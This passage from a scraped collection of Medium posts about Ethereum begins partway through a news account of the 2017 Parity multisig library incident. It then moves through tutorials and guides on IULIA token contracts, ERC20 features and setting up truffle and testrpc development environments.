deployed after 20th July. Below is full list of affected wallets (151 addresses) and their balances (513,743 eth or $152 million total) collected by crypto eli5. Hence this is approximate amount in quantifiable sense that has been affected.But the most immediate affected ICO seems to be Polkadot ICO.Parity Wallet Struck Again by Critical Vulnerability - CryptovestParity multisig wallets again revealed a critical vulnerability, locking in thousands of Ethereum and affecting the\u2026cryptovest.comPolkadot ICO had recently raised around 130 Million worth funds which may be directly affected because of this issue.Polkadot ICO Raises $130 Million and it Has Only Just BegunThe Polkadot ICO, intended for interoperable blockchains, has raised $130 million in an on-going auction style ICO that\u2026www.trustnodes.comThough they have clarified that affected multi-sig wallet that had their funds does not contain all of the Web3 Foundation\u2019s funds; so their ability to build Polkadot as planned based on the original timetable has not been affected.From the social mediaSeems some parody accounts now have cropped up who now post as devops199, with whom I have been chatting in public room. He has clarified that this below handle is not him.devops199 (@devops199) | TwitterThe latest Tweets from devops199 (@devops199). Parity Account (see what I did there? Parody)twitter.comFunny Tweets capturing some of the conversation by the alleged developer who found the exploitFrom the above conversation it seems the developer was doing some research on the July 19 multi-sig hack on the Production Ethereum Blockchain which can easily reflects the developer\u2019s noob-ness.But one has to understand that despite the exploit that the devops199 has found or created,he is been cooperative and can\u2019t be fully blamed for what happened. Though sites like coindesk and techcrunch are headlining with stuff like Ethereum Hacked or parity wallet hacked (20% of the nodes hacked). And that has already impacted market sentiment.What went\u00a0WrongIt seems to be the crux of the parity multi-sig issue is that the share library contract was destroyed because it allowed initWallet( ) to be called on itself, directly. Making it a functioning wallet instead of just a library that other wallets can use. At the moment, though the funds seems frozen in the multi-sig wallets, multi-sig wallets are still the owners of the ether. They just currently lack a withdraw( ) function to transfer them elsewhere. Because the code they need to use to withdraw their funds has been \u2018deleted\u2019. The fact that 0x863 also had contract Wallet { } is where the trouble started.Call for Hard-forkWhile some are of the view one could \u201crepair\u201d the existing ones by pointing them at a newly deployed library they still have funds, and update the wallets to use the new one. But you just can\u2019t update those deployed wallets without a fork.With almost 150 million USD worth of ETH stuck \u201cfrozen\u201d in these multi-sig wallets many of the investors are now calling for a Hard-fork to bailout the frozen funds.Technically the multisig wallets called a different contract (stored in _walletLibrary, hence the use of the name library). It\u2019s been deleted.Depending on what one means by \u2018update\u2019 a future hard fork adding recovery features might be able to help with this. They can deploy a new one, but it won\u2019t have the same address. The fork would be to update the wallets to point to the new one.But it\u2019s looking like they are stuck forever if that doesn\u2019t happen.For now only a hard fork which puts back the \u201clibrary contract\u201d in an initialized state would resolve this. Either way, this isn\u2019t looking too good for Ethereum. Some feel, it can be quite a bit nastier to recover the funds. The fork would have to reinstate the whole \u201cnot-library\u201d at the exact same address, and with its prior stored values. It could still be done, but it\u2019s not as simple as updating the wallets to a new library.Legal AngleParity Wallet Security Alert\u200a\u2014\u200aVulnerability in the Parity Wallet library contractIn another sad twist of fate again the Parity Mutisig wallets came under another critical bug or shall I say defect\u2026medium.comSome are already calling devops199 as a hacker who wanted to steal funds and others were looking at the legal ramifications of the current exploit and how it has played. Though there is a larger consensus that devops199 may not be persecuted but only time will tell.From this updated assessment from a chat room its possible devops199 may be in lot of trouble as he was recreating the july Hack on real wallets like a Black hat hacker\u00a0:looking closer, on polkadot alone, with their $90m USD balance, he called kill( ) first, then changeOwner( ) to himself 3 times, and then tried to do the delegate call to send himself 100 ETH (repeating the july hack) twice.FinallyDespite the raging controversy, it\u2019s not a problem with Ethereum, but it is a problem with the image of Ethereum, as most people may not see the difference. While some say the biggest loser out of this currently is an Ethereum co-founder, that its pretty guaranteed. Parity & Polkadot are the biggest losses for ETH. If there is one thing this event has brought, it is spicy memes. Just minutes after the library was wiped out, devops199 raised an issue at parity\u2019s github titled \u201canyone can kill your contract.\u201d \u201cI accidentally killed it,\u201dThere are also fears of legal trouble for devops199 but at the end it is one of the unfortunates issues of open source Parity wallet whose multi-sig capability seems to be cursed where the lightning of exploits has struck twice and there may be more.As someone in a chat room said:Hundreds of millions of $ Wiped out by $0.27", "responses": "3"}, {"title": "Writing Smart Contracts in\u00a0IULIA", "author_name": "Christian", "link": "https://medium.com/@chriseth/writing-smart-contracts-in-iulia-2a5ba737c7f1?source=search_post", "post_date": "Dec 19, 2017", "readtime": "8 min read", "upvotes": "357", "content": "Writing Smart Contracts in\u00a0IULIAChristianBlockedUnblockFollowFollowingDec 19, 2017People keep asking about the status of our new low-level language IULIA and are often surprised when I tell them that it is already used in the Solidity compiler. Perhaps you have even used IULIA in the past without noticing. The reason is that IULIA shares a lot of code and structure with what was previously called \u201cinline assembly\u201d. For the compiler, the distinction between the two is often not even noticeable.Since people sometimes like writing smart contracts very close to the metal (or rather close to the ether), I would like to explain how you can use IULIA to write smart contracts directly. Or perhaps almost directly. One component is missing for writing smart contracts in IULIA and that is the ability to reference code from within code. This is needed for the deployment (\u201cconstructor\u201d) part of a smart contract. We already have a specification about that, but it is not yet implemented in the Solidity compiler.Because of that, I will use the inline assembly tools for Solidity so that the compiler will create the necessary wrappers for us. Using IULIA inside of Solidity instead of stand-alone also has the benefit that we can use existing Solidity tools like the remix IDE and debugger.Since IULIA is designed to compile to different backends including the EVM but also Ethereum-flavoured WebAssembly, it comes with a certain set of built-in functions which are not exactly the EVM opcodes. While these built-in functions are not yet implemented, there is a flavour of IULIA which uses EVM opcodes instead of the built-in functions and is currently used as inline assembly for Solidity and also inside the compiler. Translating these opcodes to fully-fledged IULIA built-ins will be trivial, though.So what we are doing here is that we are using the syntactic elements of IULIA, remove types and replace the built-in functions by the EVM opcodes (in functional notation).As an example, we will implement a simple ERC20 token contract. Let us start with the surrounding Solidity code:interface ERC20 {  function totalSupply() constant returns (uint totalSupply);  function balanceOf(address _owner) constant    returns (uint balance);  function mint(address _addr, uint _value);  function transfer(address _to, uint _value);}contract MyToken {  function MyToken() {    assembly {      // init code comes here    }  }  function() payable {    assembly {      // runtime code comes here    }  }}This snippet defines the ERC20 token interface (we will use that later to interface with the contract) and a skeleton for our own token. This is the only code we will write in Solidity.If you want to try it out, paste it into https://remix.ethereum.org, switch to the \u201crun\u201d tab, select MyToken and click \u201ccreate\u201d. This creates a contract without any interface. We will later implement the ERC20 interface as specified above, although that will not be visible to the compiler. Because of that, we have to nudge remix a little: Click the \u201cclipboard\u201d symbol next to the MyToken contract just created to copy its address into the clipboard. Then paste the address into the input field next to \u201cAt address\u201d. Next, select the \u201cERC20\u201d interface in the drop-down element just above it and click \u201cAt address\u201d. Now you should have a new ERC20 instance with buttons for all the functions that are part of the interface. If you click one of these buttons now, the relevant function on MyToken will be called (just that it is not implemented yet).OK, now on to implementing those functions. First, we have to come up with how we want to use storage.Slot 0: owner / creatorSlot 1: total balance (we have to update this all the time)Slot 0x1000 + address: account balancesAfter having verified that there will be no overlap in storage, we can start with the creation code:contract MyToken {  function MyToken() {    assembly {      // Store the creator at storage slot zero      sstore(0, caller())    }  }  // ...}The IULIA snippet will result in the following stream of opcodes:CALLER PUSH1 0 SSTOREThis stores the caller/sender/creator in the first storage slot. The functional notation is probably much easier to read, but essentially, all components in such an expression are turned into EVM opcodes by just reading from right to left, ignoring any parenthesis structure. The main thing the compiler does for you is checking that the number of arguments (and later their types) matches the parameters.The next this we will do is implement an accidental Ether transfer to our token:contract MyToken {  function MyToken() {    // ...  }  function () payable {    assembly {      // Protection against sending Ether      if gt(callvalue(), 0) { revert(0, 0) }      // ...    }  }}If-statements take a single expression as condition and if it evaluates to non-zero (with introduction of types, it will check against true/false), the body is executed and skipped otherwise. This snippet reverts the call if it contains a nonzero Ether transfer.After that, we have to read the calldata and decide which function is to be called. This is called a function dispatcher. IULIA has a convenient switch statement for that purpose (I will omit the Solidity code surrounding the IULIA code from now on):// Protection against sending Etherif gt(callvalue(), 0) { revert(0, 0) }// Dispatcherswitch selector()case 0x70a08231 /* \"balanceOf(address)\" */ {  returnUint(balanceOf(decodeAsAddress(0)))}case 0x18160ddd /* \"totalSupply()\" */ {  returnUint(totalSupply())}case 0xa9059cbb /* \"transfer(address,uint256)\" */ {  transfer(decodeAsAddress(0), decodeAsUint(1))}case 0x40c10f19 /* \"mint(address,uint256)\" */ {  mint(decodeAsAddress(0), decodeAsUint(1))}default {  revert(0, 0)}So far, so boring. But actually not: What you might have noticed is that this code uses identifiers which are not EVM opcodes, but their syntax is exactly the same. This is also why we can talk about IULIA and Solidity inline assembly more or less interchangeably: The core language allows the user to define functions (more on that below), but there is not a single built-in language, not even the EVM opcodes. Then there is the actual IULIA flavour that defines some built-in functions and the Solidity inline assembly that uses EVM opcodes as built-in functions. From a semantics standpoint, it does not matter where and how the function is defined, only its semantics matter. Because of that you can have the same code compiling to different backends, have the same optimizer routines, the same simulator and only the way these built-in functions are in the end defined in the target machine is different.You might have noticed the functions called decodeAsAddress, decodeAsUint and returnUint. These handle how calldata is decoded and encodde and we will take a look at them next. By the way, it does not matter whether you first define a function and use it later or define it after it is used, it only needs to be in scope (i.e. not inside a pair of curly braces in a deeper nesting layer).function selector() -> s {  s := div(calldataload(0), 0x100000000000000000000000000000000000000000000000000000000)}function decodeAsAddress(offset) -> v {  v := decodeAsUint(offset)  if iszero(iszero(and(v,        not(0xffffffffffffffffffffffffffffffffffffffff)))) {    revert(0, 0)  }}function decodeAsUint(offset) -> v {  v := calldataload(add(4, mul(offset, 0x20)))}This snippet shows the first real difference between LLL and IULIA: It is possible to define functions and (stack) variables. LLL only knows macros and it is possible to use these macros to define memory variables and things that look similar to functions. Another difference between LLL and IULIA is where the parentheses are placed, but that is just a matter of taste.The function selector() returns the first four bytes of the calldata, properly right-aligned to ease comparisons. The other two decode values of type address and uint256, respectively where the correct value range is checked for the former. In both cases, the argument is the index of the parameter in the ABI starting with zero. For both functions, the return variable is called v and assigned in the first line.Function definitions and calls are an abstract thing in IULIA and they will be mapped to proper functions for WebAssembly. Since the EVM does not have functions, they have to be emulated with jumps, where the return PC and the arguments and return values are placed on the stack. But don\u2019t worry, the compiler will do that behind the scenes and the translation is actually very simple.Note that (internal) function calls in the EVM are rather cheap. The only reason they might be avoided is because they are called with certain arguments where further optimization might be possible for these specific arguments. If you take a look at how decodeAsAddress is used in the balanceOf part of the dispatcher above, you notice an opportunity of optimisation:case 0x70a08231 /* \"balanceOf(address)\" */ {  returnUint(balanceOf(decodeAsAddress(0)))}Since it is called with 0 as argument, which is forwarded to decodeAsUint, which in turn performsv := calldataload(add(4, mul(offset, 0x20))we see that a merecalldataload(4)would do the whole trick.Exactly because of this reason, we are currently working on an optimizing compiler for IULIA that can reduce such cases to much better performing code. Every single stage of the optimizer is easy to understand and can also emit intermediate IULIA code in readable text representation. This makes it possible to even verify the optimized code after the compiler did its job.The other benefit of such an optimizing compiler is that you can write modular code. We could have just usedreturnUint(balanceOf(calldataload(4))but this would have removed the value range check and would also be much more error-prone and harder to maintain. What happens if we want to add another parameter, for example? We would have to re-calculate the proper position in the calldata ourselves all the time.Ok, let us continue with other helper functions. We still need the value encoder:function returnUint(v) {  mstore(0, v)  return(0, 0x20)}This is where we first use this magical thing called \u201cmemory\u201d: It is a semi-volatile, byte-addressed storage. The IULIA compiler will not use it for internals, but knows how to handle it, meaning that concurrent reads and writes will work correctly even after the optimizer changed the code.Now let us add some functions to handle the internal logic of the token:function mint(account, amount) {  if iszero(calledByOwner()) { revert(0, 0) }  mintTokens(amount)  addToBalance(account, amount)}function transfer(to, amount) {  deductFromBalance(caller(), amount)  addToBalance(to, amount)}This basically only calls helper functions. The mint function reverts the call if it is not called by the owner and the transfer function removes an amount from one account and adds it to another account.function owner() -> o {  o := sload(0)}function totalSupply() -> supply {  supply := sload(1)}Remember that we said that we store the owner in the first slot and the total supply in the second? This is where this convention is used. These two functions are of course also candidates for inlining.function mintTokens(amount) {  sstore(1, safeAdd(totalSupply(), amount))}function accountToStorageOffset(account) -> offset {  offset := add(0x1000, account)}function balanceOf(account) -> bal {  bal := sload(accountToStorageOffset(account))}function addToBalance(account, amount) {  let offset := accountToStorageOffset(account)  sstore(offset, safeAdd(sload(offset), amount))}function deductFromBalance(account, amount) {  let offset := accountToStorageOffset(account)  let bal := sload(offset)  if lt(bal, amount) { revert(0, 0) }  sstore(offset, sub(bal, amount))}The only two functions that are missing now are safeAdd and calledByOwner which are defined as follows:function safeAdd(a, b) -> r {  r := add(a, b)  if or(lt(r, a), lt(r, b)) { revert(0, 0) }}function calledByOwner() -> cbo {  cbo := eq(owner(), caller())}The safeAdd function reverts in case of an overflow as a side-effect of its evaluation.The full contract can be found below, please try it out in remix with the method explained in the beginning.I hope you enjoyed this tour of IULIA and I also hope that you find it simple and flexible enough at the same time, perhaps not for implementing full smart contract but at least for nice and readable helper functions. I am open for any suggestions, comments and ideas.By the way, there is a single syntactical element we did not cover, and this is the for-loop. In total, there are only the following 9 elements:literalfunction call (including built-ins and opcodes)function definitionvariable declaration (can have multiple variables)variable assignment (can have multiple variables)if statementswitch statementfor statementstatement blockOf these, only the first two can make up expressions.", "responses": "3"}, {"title": "Introducing Waffle", "author_name": "Marek Kirejczyk", "link": "https://medium.com/ethworks/meet-waffle-8e630e5e9e91?source=search_post", "post_date": "Nov 19, 2018", "readtime": "2 min read", "upvotes": "605", "content": "Introducing WaffleMarek KirejczykBlockedUnblockFollowFollowingNov 19, 2018If you care about the quality of your software, you care about tests. If you care about tests, you care about syntax and speed. We find a good testing framework is essential for creating quality software. Which brings us to smart contracts.", "responses": "1"}, {"title": "", "author_name": "Aavesome", "link": "https://medium.com/aave/hands-on-session-for-ethlend-community-on-how-to-write-a-smart-contract-with-ethereum-ba768ed5f24?source=search_post", "post_date": "Dec 13, 2017", "readtime": "2 min read", "upvotes": "325", "content": "AavesomeBlockedUnblockFollowFollowingDec 13, 2017Hands-on Session for ETHLend Community on How to write a Smart Contract with EthereumDo you know what Ethereum platform is? Do you know what these Smart Contracts are? Do you know how to write the simple Smart Contracts on Ethereum platform?ETHLend will host a special hands on session for the ETHLend Community to encourage more awareness of smart contracts and spark some enthusiasm into smart contract development!Ethereum is an open-source, public, blockchain-based distributed computing platform featuring smart contract functionality. Ethereum Smart Contracts are written in the Solidify programming language, which has Java and JavaScript like syntax.Smart Contracts are very different from the normal software applications that programmers have been developing till date. One mind boggling aspect of Smart Contract is that, no one can change the code of the Smart Contracts once it is deployed on the Ethereum Blockchain network\u2026.This opens up the thinking like how we will change the code if we had a bug / issue in the logic itself?To know more join our Smart Contract webinar with our Technical Advisor, Jitendra Chittoda to understand the Ethereum and Smart Contracts. Jitendra has been developing and hacking into Smart Contracts more than a year. He is passionate about Blockchain, Ethereum Smart Contracts developments.He will cover following topicsWhat is EthereumWhat is Smart ContractHow many types of accounts are there in EthereumHow Ethereum transactions worksAccess Ethereum Blockchain explorerWrite a simple Smart Contract and interact with itJoin webinar @ on YouTube on 16 December 2017, 15:00 GMT\u200a\u2014\u200a16:30 GMTLink will be posted on our Channel and Telegram!https://www.youtube.com/watch?v=LsE8WuIzKgc", "responses": "2"}, {"title": "Beyond ERC20\u200a\u2014\u200aA guide to non-standard Ethereum token functionality", "author_name": "Peter Watts", "link": "https://medium.com/@ptrwtts/beyond-erc20-a-guide-to-non-standard-ethereum-token-functionality-bef5b9a9d457?source=search_post", "post_date": "Feb 15, 2018", "readtime": "6 min read", "upvotes": "263", "content": "Beyond ERC20\u200a\u2014\u200aA guide to non-standard Ethereum token functionalityPeter WattsBlockedUnblockFollowFollowingFeb 15, 2018Ethereum ERC20 tokens are often talked about as a single category, but if you dig into the source code of the most popular tokens, you\u2019ll actually find that there\u2019s an incredible amount of diversity between them. The ERC20 standard merely outlines a minimum set of functionality that a token must adhere to. Most tokens go beyond this, adding all sorts of features. This post attempts to document this landscape of \u201cnon-standard\u201d functionality, to show what\u2019s already being used in the wild, and give a glimpse of what the future holds.Note: the focus is on classic, fungible tokens, rather than non-fungible ones.ERC20Before jumping into the non-standard, let\u2019s take a quick look at the standard. A token that adheres to the ERC20 spec implements the following functions:totalSupplyGet the total token supplybalanceOf\u00a0Get the token balance of an addresstransferSend tokens to another addressapprove\u00a0Give another address permission to spend a certain allowance of tokensallowanceCheck the allowance that one address has for anothertransferFromSpend the allowance that one address has for anotherThat\u2019s it. These are the only required functions.Common AdditionsThis next set of features may not be standardized, but nearly every token includes one or all of them. Where possible, I\u2019ve included links to the source code of at least one major token implementing the feature, so you can see how it works.Minting / Crowd SalesMost tokens need a way to establish the initial allocations. Typically, this either done by building distribution / crowdsale logic directly into the token contract [SNT, RDN, REQ], or by including a generic mint() function that can be called by an external contract [OMG].PausingIn many cases, a developer doesn\u2019t want their token to be transferable during some initial period (e.g. while a crowdsale is taking place), so they include the ability to pause/unpause transfers [MANA].OwnershipIt would be problematic if any user could arbitrarily mint or pause the token, so an ownership model is usually included, that limits certain actions to the owner [KNC].BurningMany tokens include some form of burning in their economic model. Rather than do it unofficially, they introduce a burn() function, that keeps the token\u2019s \u201ctotalSupply\u201d value up to date [QSP].Unlimited AllowanceA common pattern when using approve() is to grant a very large allowance to a trusted contract (e.g. this is how the 0x protocol works). To make this simpler, some tokens consider an allowance equal to MAX_UINT to be unlimited [ZRX].Increase / Decrease ApprovalOne problem with the approve() function is that it\u2019s vulnerable to a front-running attack when trying to update an existing allowance. To avoid this, newer tokens use increaseApproval() and decreaseApproval() [LINK].Advanced FeaturesNow we\u2019re getting to the fun stuff. These features are rarer, but can add significant flexibility to a token.Vesting / Time lockingOften the creators opt to have their tokens subject to a vesting schedule [ANT] or time lock [OMG] that prevents them from immediately transferring them. Vesting can either be built directly into the token, or implemented with a dedicated contract that holds the locked tokens.Upgrading / MigratingIf something were to go wrong, or a new token standard was to emerge (see below), a token issuer may wish to upgrade [PPT] or migrate [GNT] the token to a new address.CloningThis one is weird / cool. Tokens that are built off the MiniMe library [SNT, ANT, SWT] have the ability to be cloned, with the new token taking on a distribution equal to the original token\u2019s distribution at any previous block.Restricted OwnershipSecurities tokens are becoming increasingly popular, however they come with the limitation that only accredited investors can hold them. To support this, protocols like R-Token extend ERC20 to only allow transfers from addresses that have been whitelisted in a registry.LiquidityThe Bancor token [BNT] implements a continuous supply model that allows you to buy and sell tokens directly from the smart contract, which holds Ether in reserve, and dynamically sets a price based on supply and demand.Delegated TransfersHolding ETH in order to pay gas fees on token transfers can be inconvenient for end-users. As a workaround, tokens can allow transfers to be submitted by a 3rd party, who pays the gas and collects a token fee off the user [PROPS].Potential Future StandardsMany of the features mentioned above don\u2019t need to become standards. It is perfectly OK to implement them ad-hoc, depending on the needs of the token. But other features, particularly those that establish new patterns for how tokens and contracts should interact, would benefit from becoming standardized.Transfer And CallIf you want to send ERC20 tokens to a smart contract, and have it do something with those tokens, it currently takes two transactions. First the user \u201capproves\u201d an allowance for the contract, and then the contract utilizes the tokens via the \u201ctransferFrom\u201d function.To get around this, some tokens implemented \u201capproveAndCall\u201d, which triggers a \u201creceiveApproval\u201d function in the receiving contract, allowing it to use the tokens in the same transaction. However, it never really took off as a widely adopted standard, and as a result, not many contracts handle it.Since then, there have been many more attempts to add this elusive functionality, including ERC223, ERC677, ERC777 and ERC827, but none have managed to reach consensus, or see widespread deployment.Preventing Token LossWhen you send Ether to a contract that can\u2019t handle it, the transaction fails. But if you do the same with tokens, they get trapped in the contract forever. This has led to millions of dollars worth of tokens getting lost. You can see for yourself by visiting the Etherscan page of any token, and looking at it\u2019s token balances (e.g. EOS has $800,000 trapped).Many newer token contracts add functions that allow the owner to recover any tokens that are accidentally sent to it [FUN, BNT, KNC]. However, this is just a patch, and doesn\u2019t prevent tokens being sent to other contracts. ERC223 and ERC777 (discussed in more depth below) attempt to solve this by requiring contracts to explicitly indicate that they accept tokens, and aborting the transfer if they don\u2019t.However, there is still ongoing debate over exactly how and when these scenarios should be handled, so nothing has been standardized yet.Tokens 2.0Amongst all the debate, there are two clear contenders with the potential to become the next standard in Ethereum tokens.ERC223Initially proposed almost a year ago, this standard aimed to address the two major issues mentioned above (transfer and call + lost tokens). However, the key supporters do not see backwards compatibility with ERC20 tokens and contracts as a high priority, instead emphasizing the need to move on:The point of a new standard is to NOT be compatible with ERC20 because ERC20 has design flaws.This philosophy has caused a lot of disagreement (which is ongoing to this day), and as a result, adoption has been slow.ERC777In response to the stagnation of ERC223, ERC777 was proposed and has quickly gathered support from the community. In addition to addressing the key shortcomings of ERC20 (while maintaining full backwards compatibility), it also incorporates some of the learnings around how tokens are being used in the wild. This includes creating a standard for common actions like minting/burning, and formalizing the concept of \u201cauthorized operators\u201d who can spend on your behalf.For a more in-depth look at ERC777, check out this summary reddit post, or read the official issue on Github.While it has promising momentum, it\u2019s important to note that it is still being finalized, and there are no major tokens implementing it yet (Aragon platform tokens may be one of the first).TakeawaysIf you\u2019re implementing a token, here are some things to keep in mind:ERC20 is still king. No other standard has settled yet.If you want to influence future standards, get involved with ERC777Don\u2019t be afraid to include non-standard functionality if you think it will benefit your users. Just make sure it\u2019s audited!Speaking of which, if you were clicking the links through to source code, you may have noticed a lot of similar looking functions between tokens. That\u2019s because nearly all of them are based off one of these battle-tested libraries:OpenZeppelin [OMG]MiniMe Token [SNT]Consensys [QTUM]DS Token [EOS]Not only can you get an ERC20 template from these libraries, OpenZeppelin also offers ready made implementations of many non-standard features too.Missing something?Everything discussed above is probably just scratching the surface of Ethereum token functionality that\u2019s out there in the wild. If you know of something else interesting, leave a comment or send me a tweet @ptrwtts", "responses": "2"}, {"title": "Ethereum in Depth, Part\u00a02", "author_name": "Facu Spagnuolo", "link": "https://blog.zeppelin.solutions/ethereum-in-depth-part-2-6339cf6bddb9?source=search_post", "post_date": "Jul 24, 2018", "readtime": "7 min read", "upvotes": "234", "content": "Ethereum in Depth, Part\u00a02Facu SpagnuoloBlockedUnblockFollowFollowingJul 24, 2018Photo by Steve Halama on Unsplash.Welcome to the second part of this guide. If you haven\u2019t read part 1, I highly recommend it to better understand this post. This second article will explain everything about data management. We will see how memory, storage, calldata and stack data is manipulated.To better understand this article, you should be familiar with the basics of the EVM. If you are not, I highly recommend reading these posts first.Throughout this post we will illustrate some examples and demonstrations using sample contracts you can find in this repository. Please clone it, run npm install, and check it out before beginning.Enjoy, and please do not hesitate to reach out with questions, suggestions or feedback.", "responses": "3"}, {"title": "Getting started with Ethereum as a developer", "author_name": "Ali Muzaffar", "link": "https://medium.com/bcgdv-engineering/getting-started-with-ethereum-as-a-developer-af20d78c49f?source=search_post", "post_date": "Oct 24, 2017", "readtime": "11 min read", "upvotes": "224", "content": "Getting started with Ethereum as a developerAli MuzaffarBlockedUnblockFollowFollowingOct 24, 2017As a developer, one of the first obstacles to overcome when starting a new platform is to understand the framework and how your projects are structured. This is followed by understanding how to deploy code and secure code in a test or production environment.The goal of this article is to get your started as a developer on Ethereum. We will aim to familiarise you with the tools required to setup your development environment and to deploy a smart contract on Ethereum. You don\u2019t need to have an understanding of Solidity or how to write a smart contract at this point. That is a topic for another day. We will show you how to:Setup a simulated environmentDeploy and test your smart contractsSetup a private testnet for a more realistic environment for testing your smart contracts.Setting up your first Ethereum\u00a0projectBefore we get started, let\u2019s get an introduction to the terminology and the tools we are going to use.Testnet\u200a\u2014\u200aFrom ethereum.stackexchange.comTestnets are \u201cplay money\u201d so that you can try out applications without spending real money. Applications are typically deployed on testnets before eventually being deployed on the main network. Etherbase is the account that would get the mining reward if you were mining. It has little relevance if you are not mining.Testrpc\u200a\u2014\u200afrom testrpc githubtestrpc is a Node.js based Ethereum client for testing and development. It uses ethereumjs to simulate full client behavior and make developing Ethereum applications much faster.Truffle\u200a\u2014\u200arefers to the Truffle Framework\u200a\u2014\u200athis is the most popular framework for getting started with Ethereum development. It will make your life a lot easier by handling, compiling, linking, deployment and binary management. It also handles automated testing of your smart contracts among other things.In order to create and deploy your smart contract, you need to have a blockchain to deploy and test your contract on. Here you have 4 options here:Use a dockerized testrpc image\u200a\u2014\u200aarguably this was the easiest way to get started. However, as of writing this, the image seems to have been removed so this will not be covered.Use an simulated testnet\u200a\u2014\u200acurrently, the easiest way to get startedCreate your own private TestNet\u200a\u2014\u200aarguably the hardest option. It provides you with a lot more control over your environment making running scenarios and debugging issues a lot easier.Connect to an existing TestNet\u200a\u2014\u200abest option to see how your contract will behave in the real world and easier than setting up your own private TestNet.We are going to cover the second and third points in this post. Future posts will cover connecting and deploying to a public testnet and to production, so keep an eye out.Why test in a simulated or private\u00a0testnetHowever, it is recommended that you first, test in a simulated testnet, then in a private testnet, before going to a public testnet and then finally into production. There are a few reasons for this:Debugging tools are next to non-existent so you want to control the environment as much as possible till you are sure your contract works.You don\u2019t want to spend all your ether on a testnet getting more ether even in the testnet will be a pain.You want to get an idea of the cost of storing your data on the blockchain, how much time it takes to execute your contracts and optimise them before going to a public testnet or production. Both the amount of data stored and the time it takes to execute contracts can significantly drive up the cost of using Ethereum.You may want control over the speed of mining during development or to visually inspect the whole blockchain.Setting up your environmentRequirements:NodeJs 6.0+\u200a\u2014\u200astick to the recommended versionNPM\u200a\u2014\u200aNPM comes with node, just make sure it\u2019s installed with the -g option. npm install npm -gEthereumJs\u2019s testrpc\u200a\u2014\u200anpm install -g ethereumjs-testrpcTruffle\u200a\u2014\u200anpm install -g truffleValidate that you have installed truffle properly by running truffle version on your console or command line. If you see an error something went wrong.That\u2019s it! You should have everything you need to get started as a smart contract developer.Setting up your first\u00a0projectBefore we start we should take a moment to discuss the advantages and drawbacks of using the Truffle Framework. Drawbacks include not knowing what\u2019s going on. Using Truffle is simple, it completely obfuscates what it takes to compile and deploy a contract from you. This may not work for some projects and will force you to have to learn the compile and deploy process yourself. Advantages include, not needing to know what\u2019s going on \ud83d\ude00, checking dependencies before deploying and Truffle automatically remembers where the last deployment was made to.Choose a folder for your new project. Choose a directory and path without any spaces in it. A space in the path will probably not cause any issues, but some scripts can have difficulty with it.mkdir first-smart-contractcd first-smart-contracttruffle inittruffle init creates a truffle project that points to a blockchain on your computer. This project comes with a sample contract and some tests. If you wanted an empty project, you could run truffle init bare.After running truffle init the project generated should look something like this:\u279c first-smart-contract tree.\u251c\u2500\u2500 contracts\u2502 \u251c\u2500\u2500 ConvertLib.sol\u2502 \u251c\u2500\u2500 MetaCoin.sol\u2502 \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations\u2502 \u251c\u2500\u2500 1_initial_migration.js\u2502 \u2514\u2500\u2500 2_deploy_contracts.js\u251c\u2500\u2500 test\u2502 \u251c\u2500\u2500 TestMetacoin.sol\u2502 \u2514\u2500\u2500 metacoin.js\u2514\u2500\u2500 truffle.jsIf you look inside truffle.js you\u2019ll see where a your project currently thinks an ethereum node to deploy to resides.module.exports = {  networks: {    development: {      host: \"localhost\",      port: 8545,      network_id: \"*\" // Match any network id    }  }};There is only one environment configured called development which points to localhost on port 8545. You can create paths to other environments here if you want.All the smart contract(s) reside under the contracts directory. Compiling and deploying the contracts is very straight forward.truffle compiletruffle migratetruffle compile will work, however, truffle migrate will error out since there is no blockchain running on localhost at present.What are our options to deploy to the blockchain?As mentioned earlier there are 3 main ways you can do this. Whichever way you choose the actual compile and deploy process will not change and you will still use truffle compile && truffle migrate to deploy to the chain. You can just configure the environment you want to deploy in truffle.js and then deploy to the environment using it\u2019s name truffle migrate --network <network name>. For example, our truffle.js file reads:module.exports = {   networks: {     \"live\": {       network_id: 10,       host: \"192.168.1.15\", // Point to live env       port: 8545        }   },      rpc: {     host: \"localhost\",     port: 8545   } };You can deploy to the live environment using truffle migrate --network live.Running a simulated testnet using\u00a0testrpcThis is by far the simplest way to get started.Open a console separate from the one you have been working on so far and run the command testrpc -d. The -d flag makes your testrpc run in deterministic mode. This means that all mnemonic generated along with all the test wallets and private keys will be the same each time. You can try running testrpc with and without the -d flag to see this behaviour.Once testrpc is running go back to your project directory and run truffle migrate. You should see the console running testrpc output a bunch of text showing that the contract was successfully deployed. Once the deployment is successful, you can confirm that your contract is working by running truffle test which will execute the automated tests in your sample project.That\u2019s it!Once you have done this the next step is to test your contracts in your own private testnet.But before we setup our own private testnet, let\u2019s talk about the benefits and drawback of using Truffle.Setup your own private testnet.Setting up your own private\u00a0testnetRequirementsNode 6+NPMGitGo\u200a\u2014\u200a1.7 recommendedGeth\u200a\u2014\u200aSetup Ubuntu, OSX, Windows.Note: if you\u2019re using a Debian based Linux distribution, make it Ubuntu. I tried to setup Geth on Linux Mint and kept coming up against issues. Go1.7 is recommended, however, I was able to get things up and running with Go1.6, I would recommend taking the extra step to setup Go1.7 just to invite good tides.Genesis fileBefore we setup our own private testnet, we should create a genesis file. A genesis file is the starting block for your chain. As such, it contains the initial allocation and the configuration for your chain. A genesis file is not required and you can always use a predefined one which is provided if you run geth with the --dev option. More on geth in a bit. For now, lets assume you want to use your own genesis.json file.Below is a sample genesis.json file.{    \"difficulty\": \"1\",    \"gasLimit\": \"9999999\",    \"config\": {        \"chainId\": 101,        \"homesteadBlock\": 0,        \"eip155Block\": 0,        \"eip158Block\": 0    },    \"alloc\": {        \"7ccc413a6b51be178ae62c1bcd86e8c1217c40cb\": {            \"balance\": \"1000000\"        },        \"b73f3248a841d9bb6f01d256baa3f9bfcc6a0be8\": {            \"balance\": \"1000000\"        }    }}Explaining the contents of the genesis.json filedifficulty\u200a\u2014\u200athis is the difficulty of the cryptographic function, set this to a low number to get the block to mine fast, set it to a larger number for a more realistic or slow mining result.gasLimit\u200a\u2014\u200athis is the maximum possible cost of mining a block. Set this to a high number for testing or development purposes.chainId\u200a\u2014\u200athis is the ID of the chain. In practice setting this can help provide simple validation and provide protection from playback attacks (simply put, this is when an unauthorized acts as the original sender).homesteadBlock\u200a\u2014\u200athe second major release of Ethereum was named \u201cHomestead\u201d. The first release was called \u201cFrontier\u201d. Zero-value here means that you are using Homestead.alloc\u200a\u2014\u200aas the name implies, this is the initial allocation of Ethereum (the cryptocurrency) to wallets. The 40-character hex string is the wallet address and the balance is the amount of ether allocated to each of 